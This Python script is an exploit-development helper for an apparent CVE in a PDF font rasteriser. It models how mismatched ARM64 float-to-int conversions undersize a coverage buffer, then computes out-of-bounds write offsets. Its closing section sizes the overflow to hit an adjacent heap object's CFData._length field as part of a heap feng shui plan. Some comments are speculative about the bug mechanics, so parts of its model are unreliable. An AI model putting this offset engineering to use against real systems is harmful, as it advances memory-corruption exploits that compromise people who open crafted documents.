#!/usr/bin/env python3
"""CVE-2026-86950 OOB offset calculator.

Computes the exact byte offset where the OOB write lands relative to
the coverage buffer end, for different DX and TRIGGER_X values.

The bug: aa_moveto uses FCVTZS (saturates on overflow) while aa_lineto
uses XTN (truncates to low 32 bits). When the fixed-point coordinate
overflows int32, these produce different values, causing a bbox mismatch
that undersizes the coverage buffer.
"""
import ctypes

UPM   = 16384
TF    = 1024          # PDF text size (/F1 1024 Tf)
N     = 9             # composite scaling levels
SCALE = 32767 / 16384 # F2Dot14 max, ~1.99994

INT32_MAX =  2147483647
INT32_MIN = -2147483648


def fcvtzs(val):
    """ARM64 FCVTZS: float-to-int with saturation."""
    if val != val:  # NaN
        return 0
    if val >= INT32_MAX:
        return INT32_MAX
    if val <= INT32_MIN:
        return INT32_MIN
    return int(val)


def xtn(val):
    """ARM64 XTN: narrow 64-bit to 32-bit by truncation (keeps low 32 bits)."""
    # First convert float to int64 (no saturation at 32-bit boundary)
    i64 = int(val)
    # Then truncate to low 32 bits (signed)
    return ctypes.c_int32(i64 & 0xFFFFFFFF).value


def aa_double_to_fixed_unpatched(px):
    """Unpatched aa_double_to_fixed: v = 0.5 + 4096.0 * px; return (int32_t)v.

    The compiler emits FCVTZS at the aa_moveto call site and XTN at the
    aa_lineto call site. We return both to show the differential.
    """
    v = 0.5 + 4096.0 * px
    return fcvtzs(v), xtn(v)


def analyze(dx, trigger_x):
    """Full analysis for one DX/TRIGGER_X combination."""
    # Step 1: Font-unit coordinate after N levels of ~2x scaling
    font_units = trigger_x * (SCALE ** N)

    # Step 2: Device-space coordinate
    device_x = font_units * TF / UPM

    # Step 3: Fixed-point value (what aa_double_to_fixed receives)
    fixed_raw = 0.5 + 4096.0 * device_x

    # Step 4-5: What each instruction produces
    moveto_fixed = fcvtzs(fixed_raw)   # FCVTZS (saturation)
    lineto_fixed = xtn(fixed_raw)      # XTN (truncation)

    # Step 6: Bbox computation
    # aa_moveto sets cur_x = moveto_fixed
    # aa_lineto computes dx = lineto_fixed - moveto_fixed (this is the edge delta)
    # The bbox is updated based on these values
    #
    # The bbox_max_x for the trigger contour comes from the LARGER of:
    #   moveto_fixed and lineto_fixed
    # But since moveto saturates to INT32_MAX and lineto wraps negative,
    # the bbox sees the trigger point as being at moveto_fixed (INT32_MAX)
    # for the moveto, then the lineto endpoint wraps to a small/negative value.
    #
    # However, the LEAF glyph's contour 0 (the small rect) sets the initial bbox.
    # Contour 0: moveTo(0,0) lineTo(DX,0) lineTo(DX,40) lineTo(0,40)
    # This gives bbox_max_x = DX * 4096 (in fixed point)
    #
    # Contour 1 (trigger): moveTo(TRIGGER_X, 1) lineTo(TRIGGER_X, 39)
    # After composite scaling, the TRIGGER_X coordinate overflows.
    # aa_moveto: FCVTZS → INT32_MAX → bbox expanded to INT32_MAX
    # BUT aa_add_edges computes: dx = lineto_x - moveto_x
    # If lineto wraps negative: dx = negative_val - INT32_MAX = very negative (wraps again)
    #
    # The key insight from the writeup: the bbox is computed from moveto + dx,
    # and the dx subtraction itself can wrap in int32.
    # So the bbox might end up being the SMALL rect bbox (contour 0) only,
    # because the trigger contour's bbox update wraps around and doesn't expand it.

    # Contour 0 bbox (the small rect, in fixed point, after all composite scaling)
    dx_scaled = dx * (SCALE ** N)
    device_dx = dx_scaled * TF / UPM
    bbox_max_x_contour0_fixed = int(0.5 + 4096.0 * device_dx)

    # The coverage buffer is sized from the bbox:
    # width_px = (bbox_max_x - bbox_min_x) / 4096
    # For contour 0: width_px ≈ device_dx
    width_px_from_contour0 = bbox_max_x_contour0_fixed // 4096

    # Buffer size
    buf_size = 4 * (width_px_from_contour0 + 16)

    # Step 7-8: Where the edge alpha write actually lands
    # The edge write for the trigger contour uses the ACTUAL coordinate
    # from aa_lineto (the XTN-truncated value)
    # The pixel index = lineto_fixed // 4096
    # (but it could be negative if lineto wraps negative)
    trigger_pixel = lineto_fixed // 4096

    # OOB offset relative to buffer
    # Buffer covers pixels 0 to width_px_from_contour0
    # Each pixel = 4 bytes in the coverage buffer (2 x 16-bit values)
    if trigger_pixel > width_px_from_contour0:
        oob_pixels = trigger_pixel - width_px_from_contour0
        oob_bytes = oob_pixels * 4
    elif trigger_pixel < 0:
        # Negative pixel index — writes before the buffer
        oob_pixels = trigger_pixel
        oob_bytes = trigger_pixel * 4
    else:
        oob_pixels = 0
        oob_bytes = 0

    return {
        'dx': dx,
        'trigger_x': trigger_x,
        'font_units': font_units,
        'device_x': device_x,
        'fixed_raw': fixed_raw,
        'moveto_fixed': moveto_fixed,
        'lineto_fixed': lineto_fixed,
        'bbox_max_contour0': bbox_max_x_contour0_fixed,
        'width_px': width_px_from_contour0,
        'buf_size': buf_size,
        'trigger_pixel': trigger_pixel,
        'oob_pixels': oob_pixels,
        'oob_bytes': oob_bytes,
    }


def print_analysis(r):
    print(f"\n{'='*70}")
    print(f"DX={r['dx']}, TRIGGER_X={r['trigger_x']}")
    print(f"{'='*70}")
    print(f"  1. Font units after {N} levels of ~2x scaling:")
    print(f"     {r['trigger_x']} * {SCALE:.5f}^{N} = {r['font_units']:,.1f}")
    print(f"  2. Device-space x:")
    print(f"     {r['font_units']:,.1f} * {TF}/{UPM} = {r['device_x']:,.1f}")
    print(f"  3. Fixed-point value (0.5 + 4096 * device_x):")
    print(f"     {r['fixed_raw']:,.1f}")
    print(f"     (INT32_MAX = {INT32_MAX:,})")
    overflow = r['fixed_raw'] > INT32_MAX
    print(f"     Overflows int32? {'YES' if overflow else 'NO'}")
    print(f"  4. FCVTZS (aa_moveto): {r['moveto_fixed']:,}")
    print(f"  5. XTN    (aa_lineto): {r['lineto_fixed']:,}")
    mismatch = r['moveto_fixed'] != r['lineto_fixed']
    print(f"     Mismatch? {'YES → BUG TRIGGERS' if mismatch else 'NO → no bug'}")
    print(f"  6. Contour 0 bbox_max_x (fixed): {r['bbox_max_contour0']:,}")
    print(f"     width_px from contour 0: {r['width_px']:,}")
    print(f"  7. Coverage buffer size: {r['buf_size']:,} bytes")
    print(f"     malloc actual (SMALL bin quantum): ~{((r['buf_size'] + 511) // 512) * 512:,} bytes")
    print(f"  8. Trigger edge pixel index: {r['trigger_pixel']:,}")
    if r['oob_bytes'] > 0:
        print(f"     OOB offset: +{r['oob_pixels']:,} pixels = +{r['oob_bytes']:,} bytes PAST buffer end")
        print(f"     → Writes {r['oob_bytes']:,} bytes into the NEXT heap allocation")
    elif r['oob_bytes'] < 0:
        print(f"     OOB offset: {r['oob_pixels']:,} pixels = {r['oob_bytes']:,} bytes BEFORE buffer start")
    else:
        print(f"     Within buffer bounds (no OOB)")


# Main analysis
print("CVE-2026-86950 OOB Write Offset Calculator")
print("=" * 70)
print(f"Parameters: UPM={UPM}, Tf={TF}, N={N}, SCALE={SCALE:.5f}")
print(f"SCALE^N = {SCALE**N:.4f} (effective total scaling)")

# Detailed analysis for DX=2 and DX=33
for dx_val in [2, 33]:
    r = analyze(dx_val, 32000)
    print_analysis(r)

# Sweep TRIGGER_X for DX=2 (our feng shui target)
print(f"\n\n{'='*70}")
print(f"TRIGGER_X sweep for DX=2 (feng shui target)")
print(f"{'='*70}")
print(f"{'TRIGGER_X':>10} | {'fixed_raw':>18} | {'overflow?':>9} | {'moveto':>12} | {'lineto':>12} | {'trig_px':>10} | {'OOB bytes':>10}")
print("-" * 100)

for tx in range(20000, 40001, 2000):
    r = analyze(2, tx)
    overflow = "YES" if r['fixed_raw'] > INT32_MAX else "no"
    oob_str = f"+{r['oob_bytes']:,}" if r['oob_bytes'] > 0 else (f"{r['oob_bytes']:,}" if r['oob_bytes'] < 0 else "0")
    print(f"{tx:>10,} | {r['fixed_raw']:>18,.0f} | {overflow:>9} | {r['moveto_fixed']:>12,} | {r['lineto_fixed']:>12,} | {r['trigger_pixel']:>10,} | {oob_str:>10}")

# Fine-grained sweep around the overflow boundary
print(f"\n\n{'='*70}")
print(f"Fine sweep around overflow boundary (DX=2)")
print(f"{'='*70}")
print(f"{'TRIGGER_X':>10} | {'fixed_raw':>18} | {'overflow?':>9} | {'lineto':>12} | {'trig_px':>10} | {'OOB bytes':>10}")
print("-" * 90)

# Find the boundary where overflow starts
for tx in range(26000, 28001, 100):
    r = analyze(2, tx)
    overflow = "YES" if r['fixed_raw'] > INT32_MAX else "no"
    oob_str = f"+{r['oob_bytes']:,}" if r['oob_bytes'] > 0 else (f"{r['oob_bytes']:,}" if r['oob_bytes'] < 0 else "0")
    print(f"{tx:>10,} | {r['fixed_raw']:>18,.0f} | {overflow:>9} | {r['lineto_fixed']:>12,} | {r['trigger_pixel']:>10,} | {oob_str:>10}")

# Practical: what TRIGGER_X gives OOB that lands ~40-64 bytes past buffer?
# (targeting CFData._length at offset 0x18 past the adjacent allocation)
print(f"\n\n{'='*70}")
print(f"Targeting specific OOB offsets for DX=2")
print(f"Coverage buffer = {analyze(2, 32000)['buf_size']} bytes")
print(f"malloc quantum = 5120 bytes (SMALL bin)")
print(f"Padding after buffer = 5120 - {analyze(2, 32000)['buf_size']} = {5120 - analyze(2, 32000)['buf_size']} bytes")
print(f"To reach adjacent allocation's CFData._length at +0x18:")
print(f"  Need OOB = padding + 0x18 = {5120 - analyze(2, 32000)['buf_size'] + 0x18} bytes")
print(f"{'='*70}")
